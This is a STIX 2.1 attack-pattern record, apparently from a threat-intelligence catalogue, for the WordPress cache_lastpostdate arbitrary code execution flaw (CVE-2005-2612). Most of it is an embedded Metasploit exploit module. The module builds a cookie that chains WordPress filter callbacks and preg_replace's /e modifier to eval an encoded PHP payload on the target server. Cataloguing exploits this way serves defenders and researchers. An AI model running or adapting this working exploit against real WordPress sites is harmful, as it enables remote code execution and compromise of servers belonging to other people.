{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--091dd83b-303d-43b2-a384-9a09b6e1637a",
    "created": "2024-08-14T17:13:24.222001Z",
    "modified": "2024-08-14T17:13:24.222005Z",
    "name": "WordPress cache_lastpostdate Arbitrary Code Execution",
    "description": " This module exploits an arbitrary PHP code execution flaw in the WordPress blogging software. This vulnerability is only present when the PHP 'register_globals' option is enabled (common for hosting providers). All versions of WordPress prior to 1.5.1.3 are affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_lastpost_exec.rb",
            "external_id": "wp_lastpost_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2612"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6034"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress cache_lastpostdate Arbitrary Code Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary PHP code execution flaw in the WordPress\n        blogging software. This vulnerability is only present when the PHP 'register_globals'\n        option is enabled (common for hosting providers). All versions of WordPress prior to\n        1.5.1.3 are affected.\n      },\n      'Author'         => [ 'str0ke <str0ke[at]milw0rm.com>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-2612'],\n          ['OSVDB', '18672'],\n          ['BID', '14533'],\n          ['WPVDB', '6034']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find'\n            },\n          'Space'       => 512\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2005-08-09',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The full URI path to WordPress\", \"/\"]),\n      ])\n  end\n\n  def exploit\n\n    enc = payload.encoded.unpack('C*').map { |c| \"chr(#{c})\"}.join('.') + \".chr(32)\"\n    str = Rex::Text.encode_base64('args[0]=eval(base64_decode('+enc+')).die()&args[1]=x')\n    data =\n      \"wp_filter[query_vars][0][0][function]=get_lastpostdate;wp_filter[query_vars][0][0][accepted_args]=0;\"+\n      \"wp_filter[query_vars][0][1][function]=base64_decode;wp_filter[query_vars][0][1][accepted_args]=1;\"+\n      \"cache_lastpostmodified[server]=//e;cache_lastpostdate[server]=\"+str+\n      \";wp_filter[query_vars][1][0][function]=parse_str;wp_filter[query_vars][1][0][accepted_args]=1;\"+\n      \"wp_filter[query_vars][2][0][function]=get_lastpostmodified;wp_filter[query_vars][2][0][accepted_args]=0;\"+\n      \"wp_filter[query_vars][3][0][function]=preg_replace;wp_filter[query_vars][3][0][accepted_args]=3;\"\n\n    # Trigger the command execution bug\n    res = send_request_cgi({\n        'uri'      => normalize_uri(datastore['URI']),\n        'cookie'   => data\n      }, 25)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n    else\n      print_status(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-08-09",
    "x_mitre_platforms": [
        "php'"
    ]
}